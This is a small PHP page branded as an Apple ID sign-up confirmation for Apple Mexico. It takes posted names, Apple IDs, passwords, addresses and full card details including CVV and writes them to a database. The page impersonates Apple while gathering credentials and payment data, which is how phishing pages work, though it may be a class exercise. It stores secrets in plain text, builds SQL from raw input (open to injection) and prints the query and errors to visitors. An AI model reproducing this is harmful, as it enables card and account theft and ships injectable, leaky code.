<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple ID creado con exito - Apple (MX)</title>
    <link rel="stylesheet" href="css/bootstrap.css">
</head>
<body>
    <h1>Apple ID creado con exito</h1>
    <?php include 'menu.php'; ?>
</body>
</html>



<?php    
    include 'conexion.php';

    $nombre = $_POST["nombre"];
    $fecha_nacimiento = $_POST["fecha_nacimiento"];
    $appleid = $_POST["appleid"];
    $contrasena = $_POST["contrasena"];
    $numero = $_POST["numero"];
    $direccion_envio = $_POST["direccion_envio"];
    $no_tarjeta = $_POST["no_tarjeta"];
    $cvv = $_POST["cvv"];
    $fecha_vencimiento = $_POST["fecha_vencimiento"];

    $sql = "INSERT INTO usuarios (nombre, fecha_nacimiento, appleid, contrasena, numero, direccion_envio, no_tarjeta, cvv, fecha_vencimiento)". 
    "VALUES ('".$nombre."', '".$fecha_nacimiento."', '".$appleid."', '".$contrasena."', '".$numero."', '".$direccion_envio."', '".$no_tarjeta."', '".$cvv."', '".$fecha_vencimiento."')";

    if($conexion->query($sql) === TRUE){
        echo "<a>Registro guardado con Éxito <a href='consultarDatos.php'>Regresar</a>";
        
    } else {
        echo "Error: ".$sql."<br>".$conexion->error."<br><br><a href='consultarDatos.php'>Regresar</a>";
    }

    $conexion->close();
?>


